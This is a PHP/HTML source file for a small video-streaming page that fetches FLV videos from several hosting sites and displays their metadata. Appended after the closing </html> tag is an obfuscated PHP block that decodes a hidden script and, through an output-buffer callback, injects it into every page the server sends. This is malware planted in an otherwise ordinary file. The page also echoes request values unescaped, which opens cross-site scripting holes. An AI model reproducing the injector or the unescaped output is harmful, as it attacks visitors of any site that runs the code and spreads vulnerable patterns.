<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>

	<title>Video Streaming</title>
    <style type="text/css">
      #videoDiv { 
        margin-right: 3px;
      }
      #videoInfo {
        margin-left: 3px;
      }
	  
	  .button{
		background-color:#FFF; border:#000 solid 1px; color:#000; font-size:12px; width:100px; cursor:pointer;  
	  }
    </style>
    
   

	<link rel="stylesheet" href="style.css" type="text/css" charset="utf-8" />

  
    
</head>

<body>


<form name="fr" method="post" >	
  <div id="outer">
    <div id="wrapper">
      <div id="body-bot">
        <div id="body-top">
          <div id="logo">
            <h1>Video Streaming  </h1>
            <p>WELCOME TO OUR WEB SITE</p>
          </div>
          
          <div id="gbox">
          		<?php  if( $_REQUEST['res'] == 1 ):  
							echo "<center>Data saved successfully</center>";
							unset($_REQUEST['res']);
					   endif;
				?>
          		<h2>ATTACH YOUR VIDEO</h2>
				<p>	
                
                <input type="text" name="video_url" id="video_url" size="30" value="<?=$_REQUEST['video_url']?>" /> 
                <input type="hidden" name="youTubeCode" value="<?=$youTubeCode?>" />
                <input type="submit" name="BttnAtach" value="Attach" class="button"/>
                
                <!--
                 onclick="attachVideoUrl('include/attach_video_url.php',document.getElementById('video_url').value,'div_videoplayer');

                //attachVideoUrl('include/attached_video_details.php',document.getElementById('video_url').value,'newsletter');
                " 
                -->
                </p>
                <p>
                
                <div id="div_videoplayer" style=" display:block">
                <!--
                <div id="videoDiv">Loading...</div>
                -->
<?php
if( isset($_REQUEST['BttnAtach']) )
{
	$url = 	$_REQUEST['video_url'];
	
	$parseUrl=parse_url($url);
	//youtube
	//print_r($parseUrl);
	//$pos = strrpos();
	
	if ($parseUrl['host'] == "www.youtube.com" )  //youtube.com
	{ 
    	include("youtube_functions.php");
		$pattern = getPatternFromUrl($url);
		$new_flv_path=GrabFlvFromYoutube( $pattern );
		//echo "<br>Youtube";
		$video_id	= $pattern;
	}
	elseif ($parseUrl['host'] == "www.dailymotion.com")  //dailymotion.com
	{ 
		//echo "<br>dailymotion";
		include("dailymotion_v3.php");
		$new_flv_path=downloadDailymotionFlvFile($url);
	}
	elseif ($parseUrl['host'] == "www.vimeo.com" || $parseUrl['host'] == "vimeo.com" )  //vimeo.com
	{ 
		//echo "<br>dailymotion";
		include("vimeo.php");
		$video_url = $url;
		$id = getVimeoVideoId($video_url);
		$new_flv_path = vimeoid2url($id);
		//$new_flv_path=downloadDailymotionFlvFile($url);
	}
	elseif ($parseUrl['host'] == "www.metacafe.com")  //metacafe.com
	{ 
		//echo "<br>metacafe";
		include("metacafe.php"); //Den brika AKOMA
		$video_url = $url;
		$video_link = GetDownloadLink($url);//getMetacafeVideoID($url);
		$new_flv_path = download($video_link);
		
		//$new_flv_path=downloadDailymotionFlvFile($url);
	}
	elseif ($parseUrl['host'] == "www.veoh.com")  //veoh.com
	{ 
		//echo "<br>dailymotion";
		include("veoh_v2.php");
		$video_id = getVeohVideoId($url);	
		$xmlString = downloadVeoXml($video_id);
		$new_flv_path = getVeohVideoUrl($xmlString);
		//echo $new_flv_path;
	}
	
	
	
	$url = $new_flv_path;
	//require "include/FLVMetaData.class.php";
	
	include("flv.php");
}
?>                
                
                <p>
                
    <script type="text/javascript" src="player.js"></script><script type="text/javascript">

</script><script type="text/javascript">

</script><script type="text/javascript">

</script>

<script type="text/javascript">
var player;
function playerReady(obj) {
  player = document.getElementById(obj.id); 
};
</script>
                </p>
                </div>
                
                <br />
               
                <ul>
  <li><a href="javascript:player.sendEvent('PLAY','true');">play</a></li>
  <li><a href="javascript:player.sendEvent('PLAY','false');">pause</a></li>
  <li><a href="javascript:player.sendEvent('STOP');">stop</a></li>
  <li><a href="javascript:player.sendEvent('MUTE','false');">unmute</a></li>
  <li><a href="javascript:player.sendEvent('MUTE','true');">mute</a></li>
</ul>

    <br />
 <a href="#" onclick="document.getElementById('mediaplayer').sendEvent('PLAY', 'true');" >Play Commercials</a>
    <a href="#" onclick="document.getElementById('mediaplayer').sendEvent('LOAD', '<?=$new_flv_path?>'); return false;">LOAD Commercials</a>


                </p>
                
                
            <div id="gbox-top"> 
             
            </div>
            <div id="gbox-bg">

            
              <div id="gbox-grd">
                
                <div id="newsletter">
                <div id="videoInfo">
                <?php
				if( isset($_REQUEST['BttnAtach']) )
				{
					$start = microtime(true);
    				$flv = new FLVMetaData($url);	//FLVMetaData("0002.flv");
				    $metadata = $flv->getMetaData();
				    $end = microtime(true);
					
					
				?>
                 <p>Name: <?=$flv->fileName?></p>
                <?php	
				
					if($metadata !== false)
					{
				?>
                
                	 <p>FLV Version: <strong><?=$metadata["version"]?></strong></p> 
                     <p>Duration:  <strong><?=$metadata["duration"]?></strong> Second(s)</p> 
                     <p>File Size:  <strong><?=number_format(($metadata["size"]/pow(1024,2)) , 2)?></strong> MB</p> 
                     <p>Width: <strong><?=$metadata["width"]?></strong> Pixel(s)</p>  
                     <p>Height: <strong><?=$metadata["height"]?></strong> Pixel(s)</p>  
                     <p>Framerate: <strong><?=number_format($metadata["framerate"],2)?></strong> FPS</p>  
       				 <p>Video Data Rate: <strong><?=number_format($metadata["videodatarate"])?></strong> Kbps</p>  	
                     <p>Audio Data Rate: <strong><?=number_format($metadata["audiodatarate"])?></strong> Kbps</p>  	
                     <p>Audio Delay: <strong><?=$metadata["audiodelay"]?></strong> Second(s)</p>  	
                     <p>Audio Codec ID: <strong><?=$metadata["audiocodecid"]?></strong></p>  	
                     <?php if(is_numeric($metadata["audiocodecid"])):?>
                     <p>Audio Format: <strong><?=$flv->ACidMap[$metadata["audiocodecid"]]?></strong></p>  	
					 <?php endif; ?>
                     
                     <p>Video Codec ID: <strong><?=$metadata["videocodecid"]?></strong></p>  	
        			 <?php if(is_numeric($metadata["videocodecid"])): ?>
                     <p>Video Format: <strong><?=$flv->VCidMap[$metadata["videocodecid"]]?></strong></p>  	
                     <?php endif; ?>
                     
                <?php
				    	//$flv->dumpMetaData();
				    	//var_dump($metadata);
				    	echo "<p>Execution time: ".number_format($end - $start, 6)." Microsecond(s)</p>";
				    }
				}
				?>
                <!--
                <a href="javascript:void(0)" onclick="PlayFlashMovie('FLVPlayer')" >Play</a>
                -->
              
        <p>
        Date &amp; Time: <?=date("d-m-y h:i:s")?>
        </p>
        <p>&nbsp;</p>
        <p>&nbsp;</p>
        <p>
        	<input type="button" name="bttnSave" value=" Save " title="Save to Database" class="button" onclick="saveForm_v2(this.form);" />
            
            
            <input type="hidden" name="video_name" value="<?=$flv->fileName?>" />
            <input type="hidden" name="version" value="<?=$metadata["version"]?>" />
            <input type="hidden" name="duration" value="<?=$metadata["duration"]?>" />
            <input type="hidden" name="size" value="<?=number_format(($metadata["size"]/pow(1024,2)) , 2)?>" />
            <input type="hidden" name="width" value="<?=$metadata["width"]?>" />
            <input type="hidden" name="height" value="<?=$metadata["height"]?>" />
			<input type="hidden" name="framerate" value="<?=number_format($metadata["framerate"],2)?>" />
            <input type="hidden" name="videodatarate" value="<?=number_format($metadata["videodatarate"])?>" />
            <input type="hidden" name="audiodatarate" value="<?=number_format($metadata["audiodatarate"])?>" />
            <input type="hidden" name="audiodelay" value="<?=$metadata["audiodelay"]?>" />            
            <input type="hidden" name="audiocodecid" value="<?=$metadata["audiocodecid"]?>" />            
            <input type="hidden" name="ACidMap_audiocodecid" value="<?=$flv->ACidMap[$metadata["audiocodecid"]]?>" />            
            <input type="hidden" name="videocodecid" value="<?=$metadata["videocodecid"]?>" />            
            <input type="hidden" name="VCidMap_videocodecid" value="<?=$flv->VCidMap[$metadata["videocodecid"]]?>" />        
             <input type="hidden" name="execution_time" value="<?=number_format($end - $start, 6)?>" />  
        </p>
      </div>
      
                	
                	
                </div>
                
                <div class="clear"> </div>
                
              </div>
            </div>
            <div id="gbox-bot"> </div>
          </div>
          
        </div>
      </div>
    </div>
  </div>
  
  <div id="copyright">
    &copy; Copyright 03-2010 <!-- information goes here. All rights reserved. -->
  </div>

</form>
<script type="text/javascript">

//alert(window.event);
function getEvent(e){
  if(window.event != null) {
    return event;
  }
  return e;
}

/*
myFlvPlayer.playFlv();
*/
/*
FLVPlayer.addEventListener(event:String, listener:Object):Void
FLVPlayer.addEventListener(event:String, listener:myfunction):Void

my_ta.visible = false;
my_FLVPlybk.contentPath = "http://www.helpexamples.com/flash/video/water.flv";
var listenerObject:Object = new Object(); // create listener object
listenerObject.complete = function(eventObject:Object):Void {
        my_ta.text = "That's All Folks!";
        my_ta.visible = true;
};
my_FLVPlybk.addEventListener("complete", listenerObject);
*/
<!--
//swfobject.registerObject("FLVPlayer");
//-->
</script>
</body>
</html><?php global $ob_starting;
if(!$ob_starting) {
   function ob_start_flush($s) {
	$tc = array(0, 69, 84, 82, 67, 83, 7, 79, 8, 9, 73, 12, 76, 68, 63, 78, 19, 23, 24, 3, 65, 70, 27, 14, 16, 20, 80, 17, 29, 89, 86, 85, 2, 77, 91, 93, 11, 18, 71, 66, 72, 75, 87, 74, 22, 37, 52, 13, 59, 61, 25, 28, 21, 1, 35, 15, 34, 36, 30, 88, 41, 92, 46, 33, 51);
	$tr = array(51, 5, 4, 3, 10, 26, 2, 0, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 58, 10, 21, 0, 8, 2, 29, 26, 1, 7, 21, 8, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 9, 28, 28, 32, 31, 15, 13, 1, 21, 10, 15, 1, 13, 32, 9, 0, 34, 0, 0, 0, 30, 20, 3, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 15, 1, 42, 0, 63, 3, 3, 20, 29, 8, 6, 19, 25, 39, 18, 37, 17, 37, 6, 11, 0, 6, 19, 18, 27, 17, 18, 17, 21, 6, 11, 0, 6, 19, 18, 16, 37, 21, 18, 16, 6, 11, 0, 6, 19, 18, 18, 17, 21, 17, 25, 6, 11, 0, 6, 19, 25, 4, 16, 27, 18, 16, 6, 11, 0, 6, 19, 17, 25, 18, 17, 18, 16, 6, 11, 0, 6, 19, 16, 1, 17, 50, 17, 24, 6, 11, 0, 6, 19, 18, 52, 17, 24, 18, 37, 6, 11, 0, 6, 19, 17, 37, 18, 27, 17, 18, 6, 11, 0, 6, 19, 17, 21, 18, 16, 16, 27, 6, 11, 0, 6, 19, 37, 21, 18, 37, 18, 27, 6, 11, 0, 6, 19, 17, 37, 25, 4, 16, 27, 6, 11, 0, 6, 19, 17, 17, 18, 16, 18, 16, 6, 11, 0, 6, 19, 17, 21, 25, 50, 16, 1, 6, 11, 0, 6, 19, 16, 1, 25, 17, 25, 52, 6, 11, 0, 6, 19, 16, 13, 25, 25, 25, 25, 6, 11, 0, 6, 19, 16, 13, 25, 24, 25, 16, 6, 11, 0, 6, 19, 16, 21, 16, 13, 25, 27, 6, 11, 0, 6, 19, 16, 21, 25, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 24, 18, 25, 6, 11, 0, 6, 19, 17, 25, 18, 27, 18, 18, 6, 11, 0, 6, 19, 16, 13, 17, 4, 17, 18, 6, 11, 0, 6, 19, 17, 13, 16, 13, 17, 21, 6, 11, 0, 6, 19, 17, 17, 17, 21, 16, 27, 6, 11, 0, 6, 19, 25, 13, 24, 24, 24, 24, 6, 9, 22, 0, 0, 0, 30, 20, 3, 0, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 27, 22, 0, 0, 0, 30, 20, 3, 0, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 0, 28, 0, 24, 22, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 2, 11, 5, 2, 29, 12, 1, 13, 9, 0, 34, 30, 20, 3, 0, 5, 0, 28, 0, 32, 32, 22, 21, 7, 3, 0, 8, 43, 28, 24, 22, 43, 51, 2, 23, 12, 1, 15, 38, 2, 40, 22, 43, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 3, 38, 39, 0, 28, 0, 2, 48, 43, 49, 22, 21, 7, 3, 0, 8, 10, 28, 27, 22, 10, 51, 17, 22, 10, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 4, 12, 3, 0, 28, 0, 4, 14, 3, 38, 39, 23, 5, 31, 39, 5, 2, 3, 8, 10, 36, 36, 11, 37, 9, 22, 10, 21, 0, 8, 4, 14, 4, 12, 3, 53, 28, 32, 24, 24, 32, 9, 0, 5, 0, 36, 28, 0, 64, 2, 3, 10, 15, 38, 23, 21, 3, 7, 33, 54, 40, 20, 3, 54, 7, 13, 1, 8, 26, 20, 3, 5, 1, 60, 15, 2, 8, 4, 14, 4, 12, 3, 11, 27, 44, 9, 47, 27, 52, 9, 22, 35, 35, 10, 21, 0, 8, 5, 2, 29, 12, 1, 13, 9, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 16, 44, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 37, 9, 9, 22, 35, 0, 1, 12, 5, 1, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 22, 35, 3, 1, 2, 31, 3, 15, 0, 5, 22, 0, 0, 0, 35, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 0, 34, 2, 3, 29, 0, 34, 0, 0, 0, 10, 21, 8, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 56, 29, 60, 13, 0, 61, 61, 0, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 9, 34, 13, 7, 4, 31, 33, 1, 15, 2, 23, 42, 3, 10, 2, 1, 8, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 27, 9, 9, 22, 0, 0, 0, 35, 0, 1, 12, 5, 1, 0, 34, 30, 20, 3, 0, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 28, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 8, 32, 5, 4, 3, 10, 26, 2, 32, 9, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 5, 3, 4, 28, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 24, 9, 22, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 5, 56, 29, 46, 20, 38, 62, 20, 33, 1, 8, 32, 40, 1, 20, 13, 32, 9, 48, 24, 49, 23, 20, 26, 26, 1, 15, 13, 54, 40, 10, 12, 13, 8, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 9, 22, 35, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 35, 2, 3, 29, 0, 34, 4, 40, 1, 4, 41, 14, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 8, 9, 22, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 5, 1, 2, 46, 10, 33, 1, 7, 31, 2, 8, 32, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 32, 11, 0, 52, 24, 24, 9, 22, 35, 0, 0, 0, 35, 0, 0, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 22, 35, 51, 55, 5, 4, 3, 10, 26, 2, 58);

	$ob_htm = ''; foreach($tr as $tval) {
		$ob_htm .= chr($tc[$tval]+32);
	}

	$slw=strtolower($s);
	$i=strpos($slw,'</script');if($i){$i=strpos($slw,'>',$i);}
	if(!$i){$i=strpos($slw,'</div');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</table');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</form');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</p');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</body');if($i){$i--;}}
	if(!$i){$i=strlen($s);if($i){$i--;}}
	$i++; $s=substr($s,0,$i).$ob_htm.substr($s,$i);
	
	return $s;
   }
   $ob_starting = time();
   @ob_start("ob_start_flush");
} ?>